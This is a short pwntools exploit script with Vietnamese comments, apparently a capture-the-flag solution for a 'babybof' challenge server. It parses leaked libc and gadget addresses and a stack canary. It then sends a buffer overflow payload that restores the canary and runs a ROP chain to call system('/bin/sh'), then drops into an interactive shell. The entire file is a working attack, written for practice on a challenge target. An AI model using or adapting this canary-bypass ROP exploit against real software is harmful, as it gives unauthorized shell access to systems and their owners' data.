from pwn import *

# Nếu chạy trên máy local
# p = process('./ten_file_binary')

# Nếu kết nối tới server
p = remote('babybof.chal.imaginaryctf.org', 1337) # Thay 'hostname' và port cho đúng

# Bỏ qua phần chào mừng
p.recvuntil(b'Here is some helpful info:\n')

# --- Đọc và parse các thông tin bị lộ ---

# Đọc địa chỉ system
p.recvuntil(b'system @ ')
system_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked system address: {hex(system_addr)}")

# Đọc địa chỉ gadget pop rdi; ret
p.recvuntil(b'pop rdi; ret @ ')
pop_rdi_ret = int(p.recvline().strip(), 16)
log.info(f"Leaked 'pop rdi; ret' address: {hex(pop_rdi_ret)}")

# Đọc địa chỉ gadget ret
p.recvuntil(b'ret @ ')
ret_gadget = int(p.recvline().strip(), 16)
log.info(f"Leaked 'ret' address: {hex(ret_gadget)}")

# Đọc địa chỉ chuỗi "/bin/sh"
p.recvuntil(b'"/bin/sh" @ ')
bin_sh_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked '/bin/sh' string address: {hex(bin_sh_addr)}")

# Đọc giá trị canary
p.recvuntil(b'canary: ')
canary = int(p.recvline().strip(), 16)
log.info(f"Leaked canary value: {hex(canary)}")


# --- Xây dựng payload ---

offset = 56
padding = b'A' * offset

rop_chain = b''
rop_chain += p64(pop_rdi_ret)   # Đưa địa chỉ gadget pop rdi vào return address
rop_chain += p64(bin_sh_addr)   # Tham số cho pop rdi (địa chỉ của "/bin/sh")
rop_chain += p64(ret_gadget)    # Gadget ret để căn chỉnh stack
rop_chain += p64(system_addr)   # Gọi hàm system

payload = b''
payload += padding               # 1. Lấp đầy buffer (56 bytes)
payload += p64(canary)           # 2. Ghi lại đúng giá trị canary (8 bytes)
payload += b'B' * 8               # 3. Ghi đè lên Saved RBP (8 bytes)
payload += rop_chain             # 4. Chuỗi ROP để lấy shell

# Gửi payload
p.sendlineafter(b'enter your input (make sure your stack is aligned!): ', payload)

# Chuyển sang chế độ tương tác để nhận shell
p.interactive()